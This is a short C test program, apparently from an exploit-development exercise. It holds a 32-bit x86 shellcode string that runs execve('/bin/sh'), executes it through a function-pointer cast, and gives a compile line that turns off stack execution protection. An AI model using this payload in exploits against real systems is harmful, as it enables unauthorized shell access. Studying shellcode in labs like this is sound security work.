#include <stdio.h>
#include <string.h>

/* * This is the shellcode used in generator.py.
 * Purpose: To run execve("/bin/sh", ...)
 */

int main(void) {

    char code[] =
    "\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89"
    "\xe1\xb0\x0b\xcd\x80";

    printf("Shellcode Length: %d\n", strlen(code));
    printf("Executing shellcode...\n");

    /* * Cast the array pointer (char*) to a function pointer.
     * This tells the processor to execute the array's bytes as if they were code.
     */
    int (*func)();
    func = (int (*)()) code;
    (int)(*func)();

    return 0;
}
// compile with gcc -z execstack -m32 -o shell_test shellcode_test.c
